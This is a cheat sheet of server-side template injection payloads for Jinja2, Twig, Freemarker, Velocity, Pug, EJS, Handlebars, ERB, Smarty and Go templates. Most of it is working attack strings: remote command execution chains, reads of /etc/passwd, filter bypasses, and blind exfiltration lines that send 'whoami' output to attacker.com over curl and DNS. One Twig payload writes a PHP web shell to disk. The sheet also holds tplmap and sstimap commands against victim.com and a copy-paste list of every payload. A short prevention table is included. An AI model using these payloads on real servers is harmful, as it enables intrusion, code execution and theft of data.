# SSTI PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS SSTI?

**Server-Side Template Injection (SSTI)** occurs when an attacker can inject malicious code into templates that are rendered **on the server**. The template engine executes the injected code as part of the template logic, which can lead to:

- **RCE (Remote Code Execution)** – Command execution on the server
- **File reading** (LFI)
- **Privilege escalation**
- **Sensitive data theft** (environment variables, config files)

**Key difference from XSS:**
- **XSS:** Code executes in the **client's browser**.
- **SSTI:** Code executes on the **server** (much more dangerous).

---

## 2. COMMON TEMPLATE ENGINES BY LANGUAGE

| Language | Template Engines |
|----------|------------------|
| **Python** | Jinja2, Mako, Django Templates, Tornado, Flask (render_template) |
| **Java** | Freemarker, Velocity, Thymeleaf, JSP, Pebble |
| **JavaScript/Node.js** | Pug (Jade), EJS, Handlebars, Mustache, Nunjucks |
| **PHP** | Twig, Smarty, Blade (Laravel), Mustache |
| **Ruby** | ERB, HAML, Slim |
| **Go** | Go templates, Amber, Pongo2 |

---

## 3. DETECTION PAYLOADS (UNIVERSAL)

The first step is to know **if you are vulnerable** and **which engine** is used.

**Detection payloads by engine:**

| Engine | Payload | Expected Result |
|--------|---------|-----------------|
| **Jinja2 (Python)** | `{{7*7}}` | "49" |
| **Twig (PHP)** | `{{7*7}}` | "49" |
| **Freemarker (Java)** | `${7*7}` | "49" |
| **Velocity (Java)** | `#set($x=7*7)$x` | "49" |
| **Pug (Node.js)** | `#{7*7}` | "49" |
| **EJS (Node.js)** | `<%= 7*7 %>` | "49" |
| **ERB (Ruby)** | `<%= 7*7 %>` | "49" |
| **Smarty (PHP)** | `{$smarty.now}` | Current date |
| **Go Templates** | `{{7*7}}` | "49" |

**Universal test payloads (work on several):**
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}
```

---

## 4. ENGINE IDENTIFICATION

After confirming the vulnerability, identify the exact engine:

| Payload | Engine | Result |
|---------|--------|--------|
| `{{7*'7'}}` | Jinja2 | "7777777" |
| `{{7*'7'}}` | Twig | Error or "49" |
| `${7*7}` | Freemarker | "49" |
| `#{7*7}` | Pug | "49" |
| `<%= 7*7 %>` | EJS | "49" |
| `<%= 7*7 %>` | ERB | "49" |
| `{$smarty.version}` | Smarty | Smarty version |
| `{{config.items()}}` | Flask/Jinja2 | App configuration |
| `{{self.__class__.__mro__}}` | Jinja2 | Class inheritance chain |

**Error-based identification:**
```
{{7/0}}   # Division by zero error indicates Jinja2
${7/0}    # Error indicates Freemarker or Velocity
```

---

## 5. RCE PAYLOADS BY ENGINE

### 5.1 Jinja2 (Python)

**Basic command execution:**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
List all available classes. Look for `subprocess.Popen` or `os.system`.

**Direct RCE (index may vary):**
```
{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }}
```

**Reliable chaining:**
```
# 1. Find subprocess
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 2. Use the index (e.g., 396)
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
# 3. If subprocess not found, use os.system
{{ ''.__class__.__mro__[1].__subclasses__()[408]('whoami') }}
```

**File read:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[408]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}
```

**Alternative via config (Flask):**
```
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

**Bypass using `attr()`:**
```
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

---

### 5.2 Twig (PHP)

**Command execution:**
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("whoami") }}
```

**Other variants:**
```
{{ system('whoami') }}
{{ passthru('whoami') }}
{{ exec('whoami') }}
{{ shell_exec('whoami') }}
```

**File read:**
```
{{ file_get_contents('/etc/passwd') }}
{{ include('/etc/passwd') }}
```

**Bypass if system disabled:**
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

---

### 5.3 Freemarker (Java)

**Command execution:**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("whoami") }
```

**Alternative:**
```
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", "whoami").start()}
```

**File read:**
```
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader", "/etc/passwd").read()}
```

**Alternative with class loader:**
```
<#assign classLoader=3?api.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
${clazz.getRuntime().exec("whoami")}
```

---

### 5.4 Velocity (Java)

**Command execution:**
```
#set($x="whoami")
#set($rt = $x.class.forName("java.lang.Runtime"))
#set($proc = $rt.getRuntime().exec($x))
$proc
```

**Alternative:**
```
#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("whoami"))
```

---

### 5.5 Pug (Node.js)

**Command execution:**
```
- var fs = require('fs')
- var exec = require('child_process').exec
- var output = exec('whoami', function(error, stdout, stderr) { console.log(stdout) })
```

**Inline:**
```
#{require('child_process').execSync('whoami').toString()}
```

---

### 5.6 EJS (Node.js)

**Command execution:**
```
<%= global.process.mainModule.require('child_process').execSync('whoami') %>
```

---

### 5.7 Handlebars (Node.js) - with dangerous options

```
{{#with (lookup . "constructor")}}
  {{#with (lookup . "prototype")}}
    {{#with (lookup . "process")}}
      {{#with (lookup . "mainModule")}}
        {{#with (lookup . "require")}}
          {{this "child_process" "execSync" "whoami"}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

### 5.8 ERB (Ruby)

**Command execution:**
```
<%= system("whoami") %>
<%= `whoami` %>
<%= %x(whoami) %>
```

**File read:**
```
<%= File.read("/etc/passwd") %>
```

**Escalation:**
```
<%= Open3.capture3("whoami") %>
```

---

### 5.9 Smarty (PHP)

```
{php}system('whoami'){/php}
```

---

### 5.10 Go Templates

```
{{ .Echo "whoami" }}
```
(if `Echo` is a function)

---

## 6. BLIND SSTI (NO VISIBLE OUTPUT)

When output is not visible but execution occurs.

**DNS exfiltration (Jinja2):**
```
{{ ''.__class__.__mro__[1].__subclasses__()[408]('nslookup $(whoami).attacker.com') }}
```

**HTTP exfiltration (Jinja2):**
```
{{ ''.__class__.__mro__[1].__subclasses__()[408]('curl http://attacker.com/$(whoami)') }}
```

**Time-based detection (Jinja2):**
```
{{ ''.__class__.__mro__[1].__subclasses__()[408]('sleep 10') }}
```

**Time-based (Freemarker):**
```
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Thread").sleep(10000)}
```

**Time-based (Twig):**
```
{{ system('sleep 10') }}
```

---

## 7. BYPASS TECHNIQUES

| Technique | Example (Jinja2) |
|-----------|------------------|
| **String concatenation** | `{{ ''.__class__.__mro__[1].__subclasses__()[408]('who' + 'ami') }}` |
| **Base64 encoding** | `{{ ''.__class__.__mro__[1].__subclasses__()[408](__import__('base64').b64decode('d2hvYW1p')) }}` |
| **No dots (use brackets)** | `{{ ''['__class__']['__mro__'][1]['__subclasses__']()[408]('whoami') }}` |
| **Use `attr()`** | `{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}` |
| **Use `request` (Flask)** | `{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('whoami')|attr('read')() }}` |
| **Use `[]` instead of `.`** | `{{ ""["__class__"]["__mro__"][1]["__subclasses__"]()[408]("whoami") }}` |
| **Use global variables (Flask)** | `{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}` |

**Jinja2 specific bypass:**
```
{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['whoami']) }}
```

**Twig specific bypass:**
```
{{ _self.env.registerUndefinedFilterCallback("passthru") }}
{{ _self.env.getFilter("whoami") }}
{{ _self.env.getFilter("file_put_contents")("/tmp/shell.php", "<?php system($_GET['cmd']); ?>") }}
```

**Freemarker specific bypass:**
```
${"freemarker.template.utility.JythonRuntime"?new()["eval"]("import os; os.system('whoami')")}
```

---

## 8. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Sanitize and escape everything** | Use autoescape in engines that support it. |
| **2. Use sandboxes** | Jinja2: `SandboxedEnvironment` <br> Twig: `sandbox` extension <br> Freemarker: `Configuration.setNewBuiltinClassResolver` |
| **3. Restrict dangerous functions** | Disable `system`, `exec`, `eval`, `passthru`, `shell_exec`, `popen`, `proc_open`. |
| **4. Validate user input** | Never let the user control the entire template. Use a logic-less engine (Mustache, Handlebars without helpers). |
| **5. Use safe engines** | Prefer engines that do not allow code execution (Mustache, pure Handlebars). |
| **6. Keep engines updated** | Many vulnerabilities have been patched. |
| **7. Principle of least privilege** | The application should not run as root. |
| **8. Disable `debug=True` in Flask** | Never use debug mode in production. |
| **9. Review configurations** | Freemarker: `TemplateClassResolver.ALLOWS_NOTHING` |
| **10. WAF and RASP** | Use WAF with specific SSTI rules. |

---

## 9. TOOLS

| Tool | Usage |
|------|-------|
| **Tplmap** | Automatic SSTI detection and exploitation (like sqlmap). |
| **SSTImap** | Fork of Tplmap with more engines and improvements. |
| **Burp Suite** | Intruder with detection payloads. |
| **Manual fuzzing** | Test all payloads manually. |
| **PayloadsAllTheThings** | Repository with thousands of payloads per engine. |

**Commands:**
```bash
tplmap -u "http://victim.com/?name=*" --os-cmd whoami
tplmap -u "http://victim.com/?name=*" --engine JINJA2
sstimap -u "http://victim.com/?name=*"
curl "http://victim.com/?name={{7*7}}"
curl "http://victim.com/?name=${7*7}"
curl "http://victim.com/?name=<%= 7*7 %>"
```

---

## 10. TIPS FOR TESTING

1. Identify any user input that is rendered in a template.
2. Start with universal detection payloads: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
3. If you see "49", SSTI is confirmed. Identify the engine.
4. Use engine-specific RCE payloads to execute commands.
5. If output is not visible, use blind techniques (DNS, HTTP, time-based).
6. Try bypass techniques if filters block common payloads.
7. Use `console.log('XSS')` if popups are blocked (for XSS, not SSTI).
8. Always test on your own account first.
9. For Flask/Jinja2, `config` and `request` objects are often accessible.
10. Use Tplmap or SSTImap for automation.

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
{{7*7}}
${7*7}
<%= 7*7 %>
{{7*'7'}}
#{7*7}
{$smarty.now}
{{config.items()}}
{{self.__class__.__mro__}}
{{7/0}}
${7/0}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('whoami') }}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("whoami") }}
{{ system('whoami') }}
{{ passthru('whoami') }}
{{ exec('whoami') }}
{{ shell_exec('whoami') }}
{{ file_get_contents('/etc/passwd') }}
{{ include('/etc/passwd') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("whoami") }
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", "whoami").start()}
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader", "/etc/passwd").read()}
<#assign classLoader=3?api.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
${clazz.getRuntime().exec("whoami")}
#set($x="whoami")
#set($rt = $x.class.forName("java.lang.Runtime"))
#set($proc = $rt.getRuntime().exec($x))
$proc
#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("whoami"))
- var fs = require('fs')
- var exec = require('child_process').exec
- var output = exec('whoami', function(error, stdout, stderr) { console.log(stdout) })
#{require('child_process').execSync('whoami').toString()}
<%= global.process.mainModule.require('child_process').execSync('whoami') %>
{{#with (lookup . "constructor")}}
  {{#with (lookup . "prototype")}}
    {{#with (lookup . "process")}}
      {{#with (lookup . "mainModule")}}
        {{#with (lookup . "require")}}
          {{this "child_process" "execSync" "whoami"}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
<%= system("whoami") %>
<%= `whoami` %>
<%= %x(whoami) %>
<%= File.read("/etc/passwd") %>
<%= Open3.capture3("whoami") %>
{php}system('whoami'){/php}
{{ .Echo "whoami" }}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('nslookup $(whoami).attacker.com') }}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('curl http://attacker.com/$(whoami)') }}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('sleep 10') }}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Thread").sleep(10000)}
{{ system('sleep 10') }}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('who' + 'ami') }}
{{ ''.__class__.__mro__[1].__subclasses__()[408](__import__('base64').b64decode('d2hvYW1p')) }}
{{ ''['__class__']['__mro__'][1]['__subclasses__']()[408]('whoami') }}
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('whoami')|attr('read')() }}
{{ ""["__class__"]["__mro__"][1]["__subclasses__"]()[408]("whoami") }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['whoami']) }}
{{ _self.env.registerUndefinedFilterCallback("passthru") }}
{{ _self.env.getFilter("whoami") }}
{{ _self.env.getFilter("file_put_contents")("/tmp/shell.php", "<?php system($_GET['cmd']); ?>") }}
${"freemarker.template.utility.JythonRuntime"?new()["eval"]("import os; os.system('whoami')")}
tplmap -u "http://victim.com/?name=*" --os-cmd whoami
tplmap -u "http://victim.com/?name=*" --engine JINJA2
sstimap -u "http://victim.com/?name=*"
curl "http://victim.com/?name={{7*7}}"
curl "http://victim.com/?name=${7*7}"
curl "http://victim.com/?name=<%= 7*7 %>"
```
